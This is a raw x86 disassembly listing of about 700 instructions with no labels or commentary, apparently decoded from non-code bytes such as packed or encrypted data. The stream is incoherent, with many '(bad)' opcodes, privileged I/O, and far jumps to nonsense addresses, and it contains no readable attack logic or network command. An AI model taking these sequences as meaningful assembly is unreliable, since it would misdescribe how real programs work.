  41b94f:	add    ebp,DWORD PTR [ecx-0x5ad86ee]
  41b955:	mov    al,ss:0xe563cd5e
  41b95b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b95c:	xlat   BYTE PTR ds:[ebx]
  41b95d:	or     dl,BYTE PTR [esi-0x1e]
  41b960:	nop
  41b961:	adc    DWORD PTR [edx+0x23],esp
  41b964:	sbb    DWORD PTR [ebp-0x7ecadfa],esi
  41b96a:	push   cs
  41b96b:	mov    ch,0x9
  41b96d:	and    eax,0x9d8c6ff1
  41b972:	mov    ds:0x48f327a9,eax
  41b977:	adc    al,0x6a
  41b979:	pop    edx
  41b97a:	stos   BYTE PTR es:[edi],al
  41b97b:	mov    al,ds:0x70033b4e
  41b980:	inc    esi
  41b981:	adc    esi,DWORD PTR [eax-0x1cecae35]
  41b987:	nop
  41b988:	shl    ah,0x50
  41b98b:	push   eax
  41b98c:	lods   eax,DWORD PTR ds:[esi]
  41b98d:	outs   dx,DWORD PTR ds:[esi]
  41b98e:	ret    0x18b
  41b991:	ret    0x5462
  41b994:	ds sysret 
  41b997:	inc    edx
  41b998:	call   0x49f7:0xacb59aa5
  41b99f:	add    al,0xd1
  41b9a1:	mov    BYTE PTR [esi],ch
  41b9a3:	pop    ebp
  41b9a4:	fcomi  st,st(5)
  41b9a6:	mov    DWORD PTR [ecx],0x756bf17b
  41b9ac:	loop   0x41b9d0
  41b9ae:	pop    ecx
  41b9af:	lock or ebx,DWORD PTR [ebp-0xca7a239]
  41b9b6:	cmp    al,0x8a
  41b9b8:	in     eax,dx
  41b9b9:	sub    dh,BYTE PTR [ecx-0x2a612b58]
  41b9bf:	adc    ebp,edx
  41b9c1:	std    
  41b9c2:	cmp    ecx,DWORD PTR [eax-0x223c1d26]
  41b9c8:	(bad)  
  41b9c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9ca:	ror    BYTE PTR [ebx-0x17d301a1],cl
  41b9d0:	cld    
  41b9d1:	imul   DWORD PTR [esi]
  41b9d3:	(bad)  
  41b9d4:	push   0xc
  41b9d6:	pop    esp
  41b9d7:	fidiv  WORD PTR [ecx-0x285acc70]
  41b9dd:	adc    ch,BYTE PTR [esi+0x50]
  41b9e0:	cmp    al,0xaf
  41b9e2:	mov    edx,0x5f89d072
  41b9e7:	xor    al,0x29
  41b9e9:	push   esi
  41b9ea:	out    dx,eax
  41b9eb:	sub    BYTE PTR [esi-0xfb5f449],al
  41b9f1:	in     al,dx
  41b9f2:	jp     0x41b9f5
  41b9f4:	xchg   esp,eax
  41b9f5:	xor    ebp,DWORD PTR [edx]
  41b9f7:	stos   BYTE PTR es:[edi],al
  41b9f8:	addr16 push cs
  41b9fa:	sub    esp,DWORD PTR [eax-0x18]
  41b9fd:	xor    bh,BYTE PTR [edx]
  41b9ff:	pop    ebx
  41ba00:	fwait
  41ba01:	xchg   esp,eax
  41ba02:	inc    esi
  41ba03:	sbb    DWORD PTR [edi],eax
  41ba05:	and    esp,DWORD PTR [esi]
  41ba07:	std    
  41ba08:	jbe    0x41b9ed
  41ba0a:	pop    esp
  41ba0b:	jne    0x41ba42
  41ba0d:	leave  
  41ba0e:	test   DWORD PTR [ebp+0x2f89ec84],ecx
  41ba14:	fbstp  TBYTE PTR [ebx+0x70be6d92]
  41ba1a:	les    esp,FWORD PTR [ebx+0x28]
  41ba1d:	xchg   BYTE PTR [edx],ch
  41ba1f:	aad    0xa9
  41ba21:	cld    
  41ba22:	dec    edi
  41ba23:	jnp    0x41ba1f
  41ba25:	mov    al,0x49
  41ba27:	(bad)  
  41ba28:	iret   
  41ba29:	outs   dx,BYTE PTR ds:[esi]
  41ba2a:	out    0x8c,al
  41ba2c:	sub    dl,BYTE PTR [eax]
  41ba2e:	fnsave [edi-0x7832aff4]
  41ba34:	cmc    
  41ba35:	sbb    BYTE PTR [ebx-0x3e],ah
  41ba38:	repnz add edx,DWORD PTR [edx-0x2665ac99]
  41ba3f:	push   eax
  41ba40:	xchg   ebp,eax
  41ba41:	pushf  
  41ba42:	aad    0x72
  41ba44:	jle    0x41ba3b
  41ba46:	pop    ecx
  41ba47:	jne    0x41b9cc
  41ba49:	int3   
  41ba4a:	sub    BYTE PTR [ebp+0x78],0x21
  41ba4e:	lahf   
  41ba4f:	dec    DWORD PTR [ecx-0x6c]
  41ba52:	mov    ah,0xdf
  41ba54:	inc    esi
  41ba55:	idiv   dh
  41ba57:	and    DWORD PTR [ebx],0xffffffba
  41ba5a:	pop    ebp
  41ba5b:	inc    edi
  41ba5c:	ins    BYTE PTR es:[edi],dx
  41ba5d:	cmp    eax,0x7b30a75a
  41ba62:	push   edi
  41ba63:	lahf   
  41ba64:	add    al,0x67
  41ba66:	sub    ebx,DWORD PTR [edi+eax*2-0x7]
  41ba6a:	sti    
  41ba6b:	mov    ebx,0xdf149758
  41ba70:	sbb    dl,BYTE PTR [ecx]
  41ba72:	jge    0x41ba20
  41ba74:	jae    0x41ba5c
  41ba76:	(bad)  
  41ba77:	into   
  41ba78:	mov    al,al
  41ba7a:	push   ecx
  41ba7b:	pop    edx
  41ba7c:	lea    ebx,[ecx]
  41ba7e:	xor    cl,BYTE PTR ds:0xfd4313d0
  41ba84:	cmp    cl,BYTE PTR [esi]
  41ba86:	and    esp,DWORD PTR [edi-0x13d20285]
  41ba8c:	jnp    0x41bb0d
  41ba8e:	hlt    
  41ba8f:	xchg   ebx,eax
  41ba90:	adc    ebp,ebp
  41ba92:	sbb    edx,DWORD PTR [ebx+edi*2+0x30]
  41ba96:	in     eax,0x5f
  41ba98:	int3   
  41ba99:	mov    ebp,0x61dd5fbc
  41ba9e:	cmp    eax,ecx
  41baa0:	mov    ds:0x48cc3599,eax
  41baa5:	scas   al,BYTE PTR es:[edi]
  41baa6:	add    DWORD PTR [edx+edx*4-0x21],eax
  41baaa:	dec    esp
  41baab:	je     0x41badf
  41baad:	mov    eax,ds:0x4f7f9afc
  41bab2:	rcr    BYTE PTR ds:[esi+0x3a81d1c1],1
  41bab9:	xchg   esp,eax
  41baba:	xor    DWORD PTR [ebp+0x2a],ecx
  41babd:	sar    BYTE PTR [ebx+0x50],cl
  41bac0:	aad    0x82
  41bac2:	dec    ebp
  41bac3:	mov    ds:0x3e62681a,eax
  41bac8:	out    dx,al
  41bac9:	push   ss
  41baca:	add    BYTE PTR [edi-0xce9a4c9],0xd0
  41bad1:	pop    ss
  41bad2:	dec    ebx
  41bad3:	and    al,0x74
  41bad5:	dec    eax
  41bad6:	add    edx,eax
  41bad8:	imul   eax,DWORD PTR [ebp+0x5a56ad0f],0x6e
  41badf:	fs jl  0x41ba65
  41bae2:	dec    ebx
  41bae3:	lahf   
  41bae4:	dec    edi
  41bae5:	and    DWORD PTR [ebx+0x25dee4ff],esp
  41baeb:	add    BYTE PTR [eax],dl
  41baed:	pop    esi
  41baee:	adc    eax,0x39ab2f0f
  41baf3:	jbe    0x41badb
  41baf5:	fcomp  QWORD PTR [ebx+0x9]
  41baf8:	mov    edi,0x49ef50d9
  41bafd:	pop    ebx
  41bafe:	or     ebx,DWORD PTR [esi-0x17]
  41bb01:	enter  0x1c47,0x15
  41bb05:	daa    
  41bb06:	xchg   ebx,eax
  41bb07:	sbb    BYTE PTR [ecx-0x67a7973f],ch
  41bb0d:	loop   0x41ba97
  41bb0f:	arpl   WORD PTR [edx],ax
  41bb11:	in     al,dx
  41bb12:	outs   dx,DWORD PTR ds:[esi]
  41bb13:	shl    DWORD PTR [ebp-0x6f],0xe2
  41bb17:	neg    DWORD PTR [ebx]
  41bb19:	jnp    0x41bb51
  41bb1b:	xlat   BYTE PTR ds:[ebx]
  41bb1c:	mov    cs,WORD PTR [ebx+edx*8-0x6d6d4c2b]
  41bb23:	outs   dx,DWORD PTR ds:[esi]
  41bb24:	or     edi,esi
  41bb26:	add    BYTE PTR [edx+0xe57e0d6],bl
  41bb2c:	stos   DWORD PTR es:[edi],eax
  41bb2d:	add    BYTE PTR [edi+0x54],bl
  41bb30:	pusha  
  41bb31:	leave  
  41bb32:	pop    edi
  41bb33:	retf   
  41bb34:	cmp    al,0xe
  41bb36:	mov    dl,0x5e
  41bb38:	cmp    esp,DWORD PTR [edx-0x53cd6fe]
  41bb3e:	xchg   ebx,eax
  41bb3f:	xor    eax,0x88c48b94
  41bb44:	sub    al,0xc0
  41bb46:	ins    DWORD PTR es:[edi],dx
  41bb47:	loop   0x41bb80
  41bb49:	push   ebp
  41bb4a:	iret   
  41bb4b:	push   es
  41bb4c:	call   0x6694:0x9076f809
  41bb53:	pop    eax
  41bb54:	inc    ebx
  41bb55:	add    eax,DWORD PTR [edx+0x33456d3b]
  41bb5b:	xchg   ebx,eax
  41bb5c:	repnz and BYTE PTR [ebp+0x1fa829e1],dh
  41bb63:	sbb    DWORD PTR [esi+eiz*4],ecx
  41bb66:	mov    BYTE PTR [eax-0x1d256d56],cl
  41bb6c:	push   0xffffffb8
  41bb6e:	push   0xffffffb3
  41bb70:	sbb    ebx,DWORD PTR [ebx-0x32]
  41bb73:	sbb    BYTE PTR [ebx-0x74],dl
  41bb76:	jle    0x41bbf1
  41bb78:	cmc    
  41bb79:	jle    0x41bbb6
  41bb7b:	mov    cl,0xbb
  41bb7d:	das    
  41bb7e:	sub    cl,ch
  41bb80:	pop    ebx
  41bb81:	loop   0x41bbbb
  41bb83:	sbb    al,0x89
  41bb85:	addr16 dec esp
  41bb87:	outs   dx,DWORD PTR ds:[esi]
  41bb88:	sti    
  41bb89:	test   eax,0xb01c6459
  41bb8e:	inc    esp
  41bb8f:	and    al,0x38
  41bb91:	(bad)  
  41bb92:	cli    
  41bb93:	aad    0x36
  41bb95:	mov    ds:0x6f451809,al
  41bb9a:	fild   QWORD PTR [ebp-0x44]
  41bb9d:	mov    dh,0xe2
  41bb9f:	push   eax
  41bba0:	xor    dl,BYTE PTR [eax-0x32]
  41bba3:	push   ecx
  41bba4:	lea    ebp,[edi-0xe]
  41bba7:	add    BYTE PTR [edx],ch
  41bba9:	xchg   ecx,eax
  41bbaa:	arpl   bp,ax
  41bbac:	sbb    ah,bl
  41bbae:	sbb    ah,BYTE PTR [ebp+eax*1-0x34]
  41bbb2:	jae    0x41bb3d
  41bbb4:	or     al,0xd2
  41bbb6:	xor    DWORD PTR [ebp-0x17],ebp
  41bbb9:	jp     0x41bb9e
  41bbbb:	std    
  41bbbc:	cmp    eax,0x92a44fb7
  41bbc1:	mov    BYTE PTR [edi+0x435dbc24],ah
  41bbc7:	inc    ebp
  41bbc8:	das    
  41bbc9:	fsubr  QWORD PTR [eax+eiz*2+0x14]
  41bbcd:	jge    0x41bc38
  41bbcf:	push   0x19
  41bbd1:	mov    bh,0x6f
  41bbd3:	sbb    DWORD PTR [edx+0x33],0xd983b899
  41bbda:	cs jecxz 0x41bb86
  41bbdd:	xchg   edx,eax
  41bbde:	test   DWORD PTR [ebx-0x50],esp
  41bbe1:	cmp    eax,0xafbaea5b
  41bbe6:	push   0x83ac620c
  41bbeb:	xor    al,0x90
  41bbed:	fld    QWORD PTR [ecx]
  41bbef:	outs   dx,BYTE PTR ds:[esi]
  41bbf0:	jge    0x41bc44
  41bbf2:	jmp    0x41bbd3
  41bbf4:	mov    WORD PTR [esi],fs
  41bbf6:	jle    0x41bc00
  41bbf8:	(bad)  
  41bbf9:	and    DWORD PTR [esi],0x0
  41bbfc:	div    ah
  41bbfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbff:	xor    dh,BYTE PTR [ebp-0x236b0dc]
  41bc05:	cld    
  41bc06:	pop    ds
  41bc07:	sti    
  41bc08:	les    ebx,FWORD PTR [edi-0x33c10b1d]
  41bc0e:	sub    ah,ch
  41bc10:	lods   eax,DWORD PTR ds:[esi]
  41bc11:	jnp    0x41bc13
  41bc13:	pop    ebp
  41bc14:	repnz mov bl,0x6c
  41bc17:	cmp    eax,0xea1b0b30
  41bc1c:	xchg   esi,eax
  41bc1d:	inc    esp
  41bc1e:	mov    edi,0x2070fc13
  41bc23:	dec    esi
  41bc24:	pop    ss
  41bc25:	daa    
  41bc26:	jmp    0x8836:0x83125f97
  41bc2d:	in     eax,dx
  41bc2e:	xor    cl,BYTE PTR [ecx+0xb6a981e]
  41bc34:	sub    eax,0x85e0fda6
  41bc39:	sub    bl,BYTE PTR ds:0xc4d2db13
  41bc3f:	fs xchg esi,eax
  41bc41:	jno    0x41bc84
  41bc43:	mov    cl,0x6b
  41bc45:	push   es
  41bc46:	xor    eax,0xc1d93000
  41bc4b:	sar    DWORD PTR [esi],0xaf
  41bc4e:	pop    ebp
  41bc4f:	dec    ecx
  41bc50:	sbb    al,0xf6
  41bc52:	iret   
  41bc53:	add    al,0x2f
  41bc55:	push   eax
  41bc56:	je     0x41bc0f
  41bc58:	pop    ebx
  41bc59:	scas   al,BYTE PTR es:[edi]
  41bc5a:	pop    es
  41bc5b:	dec    esp
  41bc5c:	cmp    esi,esp
  41bc5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc5f:	add    al,0x6a
  41bc61:	mov    DWORD PTR [ebp-0x1b1ae740],0xeae18f3a
  41bc6b:	pop    ebx
  41bc6c:	push   ecx
  41bc6d:	cmp    esi,eax
  41bc6f:	mov    al,ds:0xdc0b8963
  41bc74:	(bad)  
  41bc75:	mov    ?,WORD PTR [edi]
  41bc77:	sbb    DWORD PTR [eax],edi
  41bc79:	imul   esp,DWORD PTR [ecx+0x3dbf7dbd],0x61
  41bc80:	pushf  
  41bc81:	out    0x63,eax
  41bc83:	mov    bl,0x15
  41bc85:	inc    edx
  41bc86:	cmp    edi,DWORD PTR [ebp+0x7b]
  41bc89:	dec    ebp
  41bc8a:	cmp    al,0x35
  41bc8c:	xchg   ebx,eax
  41bc8d:	add    ebx,esp
  41bc8f:	into   
  41bc90:	jo     0x41bc3b
  41bc92:	js     0x41bcca
  41bc94:	leave  
  41bc95:	sub    BYTE PTR [edx-0xa32709e],bl
  41bc9b:	xchg   ebx,eax
  41bc9c:	mov    dl,0xe
  41bc9e:	or     al,0x6b
  41bca0:	daa    
  41bca1:	in     eax,dx
  41bca2:	sub    al,0x5d
  41bca4:	jb     0x41bcd7
  41bca6:	push   0xffffff9c
  41bca8:	stc    
  41bca9:	inc    esi
  41bcaa:	(bad)  
  41bcab:	push   eax
  41bcad:	xlat   BYTE PTR ds:[ebx]
  41bcae:	mov    edx,0x799682dd
  41bcb3:	pop    ebx
  41bcb4:	sar    BYTE PTR [edi+0x31],1
  41bcb7:	inc    ecx
  41bcb8:	and    BYTE PTR [edx-0x7a],cl
  41bcbb:	pushf  
  41bcbc:	dec    edx
  41bcbd:	dec    ecx
  41bcbe:	in     al,dx
  41bcbf:	dec    ebx
  41bcc0:	dec    eax
  41bcc1:	clc    
  41bcc2:	popa   
  41bcc3:	ss mov ebp,0xe03d3bb5
  41bcc9:	enter  0xf72,0xb0
  41bccd:	in     eax,dx
  41bcce:	xor    eax,0x3e2776e1
  41bcd3:	test   al,0x58
  41bcd5:	aas    
  41bcd6:	xchg   edx,eax
  41bcd7:	jl     0x41bd37
  41bcd9:	adc    al,0x9f
  41bcdb:	jae    0x41bd4a
  41bcdd:	jmp    0x190c:0x55699220
  41bce4:	cmove  esi,DWORD PTR [ecx-0x4]
  41bce8:	push   es
  41bce9:	or     DWORD PTR [edx],edx
  41bceb:	sbb    esi,eax
  41bced:	sbb    ebp,DWORD PTR [edx+0x6d916041]
  41bcf3:	or     eax,DWORD PTR [eax]
  41bcf5:	sar    BYTE PTR [ebx-0x27],cl
  41bcf8:	popa   
  41bcf9:	push   0x35
  41bcfb:	enter  0x35ba,0x1c
  41bcff:	clc    
  41bd00:	pusha  
  41bd01:	rcr    ecx,cl
  41bd03:	addr16 inc esi
  41bd05:	sbb    al,dh
  41bd07:	pop    esi
  41bd08:	pop    esp
  41bd09:	cmp    DWORD PTR [esi-0x7a],edx
  41bd0c:	retf   0xb182
  41bd0f:	inc    edi
  41bd10:	test   eax,0xc43f6495
  41bd15:	jp     0x41bcdc
  41bd17:	jle    0x41bcea
  41bd19:	mov    dl,0xf6
  41bd1b:	jmp    0x5de880e
  41bd20:	push   esp
  41bd21:	sahf   
  41bd22:	(bad)  
  41bd23:	call   0xf79a:0xfc879755
  41bd2a:	jb     0x41bd49
  41bd2c:	sbb    eax,0x8c5008a4
  41bd31:	jmp    0x41bd74
  41bd33:	adc    al,0xa6
  41bd35:	popf   
  41bd36:	mov    ds:0xb9ee1efd,al
  41bd3b:	dec    ebp
  41bd3c:	sar    dl,0x9a
  41bd3f:	push   0x76a8eca7
  41bd44:	xlat   BYTE PTR ds:[ebx]
  41bd45:	pop    eax
  41bd46:	test   DWORD PTR [edi],edx
  41bd48:	fidivr DWORD PTR [ebx+0x15]
  41bd4b:	jecxz  0x41bd6a
  41bd4d:	jl     0x41bce9
  41bd4f:	(bad)  
  41bd50:	cwde   
  41bd51:	jmp    0x348e2030
  41bd56:	push   ebx
  41bd57:	adc    ah,BYTE PTR [esi-0x54]
  41bd5a:	jns    0x41bd93
  41bd5c:	and    cl,BYTE PTR [edx+0x54]
  41bd5f:	lea    ebp,[ebx+0x4ce572f1]
  41bd65:	add    DWORD PTR [edi-0x7a],esi
  41bd68:	les    eax,FWORD PTR [ecx]
  41bd6a:	push   0xc73699c7
  41bd6f:	jo     0x41bd3f
  41bd71:	dec    edi
  41bd72:	adc    eax,0x3e55c982
  41bd77:	pop    ecx
  41bd78:	inc    esi
  41bd79:	mov    bl,0xe1
  41bd7c:	push   eax
  41bd7d:	add    dh,bl
  41bd7f:	sbb    eax,0x57b91b60
  41bd84:	dec    edi
  41bd85:	and    dl,al
  41bd87:	shr    DWORD PTR [esi+0x39],1
  41bd8a:	jl     0x41bd27
  41bd8c:	jp     0x41bda7
  41bd8e:	inc    ebx
  41bd8f:	xlat   BYTE PTR ds:[ebx]
  41bd90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd91:	je     0x41bd9f
  41bd93:	or     cl,bh
  41bd95:	jecxz  0x41bda2
  41bd97:	les    esi,FWORD PTR [esi]
  41bd99:	ins    DWORD PTR es:[edi],dx
  41bd9a:	jnp    0x41bd8f
  41bd9c:	scas   al,BYTE PTR es:[edi]
  41bd9d:	mov    WORD PTR [ebp-0x37],ds
  41bda0:	and    ebp,DWORD PTR [esi+0x43]
  41bda3:	pop    es
  41bda4:	aas    
  41bda5:	add    al,BYTE PTR [ecx+ecx*8-0x18]
  41bda9:	xor    al,BYTE PTR [ecx+0x45e5956]
  41bdaf:	xor    eax,0xcdada4ab
  41bdb4:	xor    DWORD PTR [esi+0xd008718],ecx
  41bdba:	sbb    ecx,edx
  41bdbc:	jl     0x41bdb7
  41bdbe:	call   0xee80:0xe238c904
  41bdc5:	into   
  41bdc6:	fs pop ecx
  41bdc8:	(bad)  
  41bdc9:	pop    edi
  41bdca:	mov    edx,0x21e25d5e
  41bdcf:	aad    0x6d
  41bdd1:	test   eax,0x9454257c
  41bdd6:	lods   al,BYTE PTR ds:[esi]
  41bdd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bdd8:	pop    edx
  41bdd9:	test   BYTE PTR [edx],cl
  41bddb:	call   0xbadb2e58
  41bde0:	add    BYTE PTR [edi+0x5],ch
  41bde3:	(bad)  
  41bde4:	call   0xb736e813
  41bde9:	outs   dx,DWORD PTR ds:[esi]
  41bdea:	mov    ah,0xc2
  41bdec:	and    ah,BYTE PTR [ecx-0xa]
  41bdef:	jge    0x41be6a
  41bdf1:	xchg   edx,eax
  41bdf2:	jnp    0x41bd9c
  41bdf4:	mov    bh,0xe6
  41bdf6:	adc    edx,ebx
  41bdf8:	jnp    0x41bd9e
  41bdfa:	pop    ebp
  41bdfb:	or     DWORD PTR [ecx],esi
  41bdfd:	pop    ss
  41bdfe:	cmp    al,BYTE PTR [eax+eax*1-0x52113d3a]
  41be05:	fwait
  41be06:	add    dl,BYTE PTR [ebx-0x5a]
  41be09:	and    al,0xbc
  41be0b:	hlt    
  41be0c:	or     edx,0xffffffe9
  41be0f:	push   ds
  41be10:	and    al,0x99
  41be12:	in     eax,0xf
  41be14:	shl    DWORD PTR [eax+0x16],1
  41be17:	and    DWORD PTR [edi-0x2],esp
  41be1a:	mov    WORD PTR [ebx-0x46df147d],ss
  41be20:	aam    0xa
  41be22:	mov    ah,BYTE PTR [ebp-0x15d876f6]
  41be28:	lods   eax,DWORD PTR ds:[esi]
  41be29:	iret   
  41be2a:	fild   WORD PTR [edx+0x4d]
  41be2d:	pop    ebp
  41be2e:	jae    0x41be6b
  41be30:	push   edx
  41be31:	or     BYTE PTR [esi],0x2c
  41be34:	hlt    
  41be35:	ins    DWORD PTR es:[edi],dx
  41be36:	mov    ah,0x62
  41be38:	je     0x41bdea
  41be3a:	imul   ebx,esi,0xffffff90
  41be3d:	(bad)  
  41be3e:	lods   al,BYTE PTR ds:[esi]
  41be3f:	aad    0x3f
  41be41:	mov    al,BYTE PTR [ebp+edx*8-0x516d672a]
  41be48:	outs   dx,DWORD PTR ds:[esi]
  41be49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be4a:	jnp    0x41be5b
  41be4c:	jnp    0x41be22
  41be4e:	aam    0xa
  41be50:	add    BYTE PTR [edx],al
  41be52:	lods   eax,DWORD PTR ds:[esi]
  41be53:	push   ebp
  41be54:	mov    bh,0xa7
  41be56:	xlat   BYTE PTR ds:[ebx]
  41be57:	mov    dl,0x8f
  41be59:	pushf  
  41be5a:	test   ecx,esi
  41be5c:	sub    eax,0x4b83c9a2
  41be61:	add    al,0xfd
  41be63:	push   ebp
  41be64:	mov    bh,0x4e
  41be66:	(bad)  [esi-0x7e]
  41be69:	or     ebp,ebx
  41be6b:	lds    esp,FWORD PTR [ebx]
  41be6d:	push   edx
  41be6e:	adc    dl,0x21
  41be71:	ret    
  41be72:	adc    edi,0x8b45b925
  41be78:	lods   eax,DWORD PTR ds:[esi]
  41be79:	adc    DWORD PTR [ecx],ecx
  41be7b:	rcl    BYTE PTR [ecx-0x70216c01],0xf2
  41be82:	jns    0x41be9a
  41be84:	loope  0x41beb9
  41be86:	xchg   dh,dl
  41be88:	ja     0x41bedb
  41be8a:	mov    ah,0x4a
  41be8c:	or     DWORD PTR [eax+0x42f3bb10],ebx
  41be92:	in     eax,dx
  41be93:	aas    
  41be94:	mov    ecx,0xed87fe3e
  41be99:	adc    ebx,DWORD PTR [edx-0x2d595f5e]
  41be9f:	shl    cl,1
  41bea1:	mov    DWORD PTR [edi+0x6984ad67],ebx
  41bea7:	push   ecx
  41bea8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bea9:	inc    ebx
  41beaa:	xor    eax,edi
  41beac:	shr    BYTE PTR [eax+0x1b4990ca],cl
  41beb2:	inc    esp
  41beb3:	inc    ebp
  41beb4:	jno    0x41bf04
  41beb6:	jo     0x41beb5
  41beb8:	sbb    al,0x8b
  41beba:	addr16 nop
  41bebc:	loop   0x41be60
  41bebe:	rol    BYTE PTR [esi+esi*8],0x12
  41bec2:	mov    ebp,0x7d5e9300
  41bec7:	adc    esp,DWORD PTR [esp+ecx*1-0x5588af87]
  41bece:	int    0xab
  41bed0:	pop    ds
  41bed1:	jne    0x41bedf
  41bed3:	clc    
  41bed4:	retf   
  41bed5:	add    bh,BYTE PTR [eax-0x473ec5e0]
  41bedb:	sbb    al,bl
  41bedd:	push   ebp
  41bede:	cli    
  41bedf:	mov    BYTE PTR [esi+0x40f4ea16],dl
  41bee5:	fsubp  st(3),st
  41bee7:	pushf  
  41bee8:	sbb    al,0x20
  41beea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41beeb:	(bad)  
  41beec:	rcr    BYTE PTR [eax-0x5c9ad188],1
  41bef2:	dec    edi
  41bef3:	mov    ebx,0x101af514
  41bef8:	popf   
  41bef9:	adc    eax,0xc73f8eb7
  41befe:	shl    BYTE PTR fs:[eax-0x49],cl
  41bf02:	inc    ebp
  41bf03:	das    
  41bf04:	in     al,0xc5
  41bf06:	mov    cl,0xd3
  41bf08:	mov    cl,0xba
  41bf0a:	inc    esi
  41bf0b:	add    al,0x1b
  41bf0d:	out    dx,eax
  41bf0e:	stos   BYTE PTR es:[edi],al
  41bf0f:	test   al,0x40
  41bf11:	mov    ah,0x46
  41bf13:	push   cs
  41bf14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf15:	lahf   
  41bf16:	and    BYTE PTR [ecx+0x60],cl
  41bf19:	xchg   DWORD PTR [ebp-0x6],edx
  41bf1c:	push   esi
  41bf1d:	iret   
  41bf1e:	inc    ebx
  41bf1f:	sahf   
  41bf20:	adc    DWORD PTR [edi],ebp
  41bf22:	(bad)  [ebp+ecx*8+0x1]
  41bf26:	mov    al,0xb2
  41bf28:	inc    edi
  41bf29:	fcom   DWORD PTR [edi-0x27a4841b]
  41bf2f:	xor    al,0xd
  41bf31:	test   BYTE PTR [edi+0x79b03692],al
  41bf37:	xchg   edi,eax
  41bf38:	cmp    eax,0x30d1d4a
  41bf3d:	popf   
  41bf3e:	outs   dx,DWORD PTR ds:[esi]
  41bf3f:	mov    eax,ds:0x44fb758
  41bf44:	int3   
  41bf45:	cmp    DWORD PTR [edx-0x60eca8ad],0x5a2e0900
  41bf4f:	out    0xea,al
  41bf51:	into   
  41bf52:	jb     0x41bf9d
  41bf54:	cwde   
  41bf55:	add    al,0xee
  41bf57:	pop    esi
  41bf58:	dec    ebx
  41bf59:	inc    ebx
  41bf5a:	(bad)  
  41bf5b:	sti    
  41bf5c:	jg     0x41bef3
  41bf5e:	push   eax
  41bf5f:	jmp    0x68559d1c
  41bf64:	and    al,0x7e
  41bf66:	inc    edx
  41bf67:	stc    
  41bf68:	jbe    0x41bef8
  41bf6a:	cmp    al,0x71
  41bf6c:	in     al,0x99
  41bf6e:	mov    BYTE PTR [ebx+0x6a4297b4],cl
  41bf74:	mov    ebp,0xe129e612
  41bf79:	sbb    edi,esp
  41bf7b:	add    ch,BYTE PTR [ebp+0x54]
  41bf7e:	adc    al,0x84
  41bf80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf81:	mov    ah,0xf3
  41bf83:	outs   dx,DWORD PTR ds:[esi]
  41bf84:	mov    ch,0x32
  41bf86:	fcomp  DWORD PTR [esp+eiz*4]
  41bf89:	ja     0x41c004
  41bf8b:	ror    ah,cl
  41bf8d:	std    
  41bf8e:	sbb    DWORD PTR [ecx+ebp*4-0x5f],edx
  41bf92:	or     BYTE PTR [edx],dl
  41bf94:	dec    eax
  41bf95:	jle    0x41bff4
  41bf97:	xor    BYTE PTR [edi],0x77
  41bf9a:	mov    bh,0x98
  41bf9c:	bound  esi,QWORD PTR [ecx+0x45]
  41bf9f:	sub    DWORD PTR [edx+0x3d090e8c],esi
  41bfa5:	mov    dh,0x19
  41bfa7:	and    eax,0xdbe8437c
  41bfac:	adc    al,0xe3
  41bfae:	frstor [ebp-0x66db4d5b]
  41bfb4:	xchg   ah,dl
  41bfb6:	push   eax
  41bfb7:	sub    eax,0x81e5b016
  41bfbc:	or     bh,bl
  41bfbe:	in     eax,dx
  41bfbf:	and    BYTE PTR [esi+eiz*1+0x7a],ah
  41bfc3:	retf   
  41bfc4:	mov    ds:0x8bf3fbe7,eax
  41bfc9:	xchg   esi,eax
  41bfca:	in     eax,0x10
  41bfcc:	sti    
  41bfcd:	and    BYTE PTR [eax-0x5c],ah
  41bfd0:	add    BYTE PTR [edx+esi*4-0x1e2f1190],dl
  41bfd7:	jmp    0x11d208fd
  41bfdc:	fwait
  41bfdd:	inc    edx
  41bfde:	fsubr  QWORD PTR [edi+0x25f026a7]
  41bfe4:	test   DWORD PTR [edi+0x1468e95d],ecx
  41bfea:	dec    eax
  41bfeb:	daa    
  41bfec:	rol    al,1
  41bfee:	and    eax,0xa3e9a3e7
  41bff3:	add    DWORD PTR [ebx+ebp*4-0x74c66adf],eax
  41bffa:	ja     0x41bf9c
  41bffc:	mov    al,0xc0
  41bffe:	push   ebp
  41bfff:	xor    eax,0x1549c3fe
  41c004:	mov    ebp,0x71cfc399
  41c009:	mov    DWORD PTR [ecx-0x22],edx
  41c00c:	pop    edx
  41c00d:	add    al,0xaa
  41c00f:	mov    ebx,0xd3f0cf9a
  41c014:	lods   eax,DWORD PTR ds:[esi]
  41c015:	cmp    bh,al
  41c017:	nop
  41c018:	pop    edx
  41c019:	xchg   ebx,eax
  41c01a:	int3   
  41c01b:	pop    edi
  41c01c:	sti    
  41c01d:	inc    ebx
  41c01e:	cwde   
  41c01f:	xchg   esi,eax
  41c020:	pop    esp
  41c021:	and    ch,ah
  41c023:	xchg   esp,eax
  41c024:	mov    WORD PTR [ebp+0xf],gs
  41c027:	add    BYTE PTR [edx+0x2f],dh
  41c02a:	sbb    DWORD PTR [ebx+0x77cff480],edi
  41c030:	jae    0x41c021
  41c032:	jp     0x41bfc3
  41c034:	jne    0x41c01e
  41c036:	repz push edi
  41c038:	inc    esi
  41c039:	out    0x25,eax
  41c03b:	je     0x41c0a4
  41c03d:	(bad)  
  41c03e:	arpl   WORD PTR [ebx+eax*4+0x7f186698],sp
  41c045:	fld    QWORD PTR [ecx-0x744283d6]
  41c04b:	jl     0x41c0b0
  41c04d:	cmp    dh,dh
  41c04f:	retf   
  41c050:	mov    BYTE PTR [esi],al
  41c052:	cmp    BYTE PTR [ecx+eax*2-0x4e95c89c],cl
  41c059:	mov    ah,0xe
  41c05b:	and    eax,0xa60316f1
  41c060:	jns    0x41bfe9
  41c062:	retf   
  41c063:	jmp    0xe18809aa
  41c068:	ret    
  41c069:	inc    esp
  41c06a:	imul   esp,DWORD PTR [edx-0x5312fb71],0xffffffdf
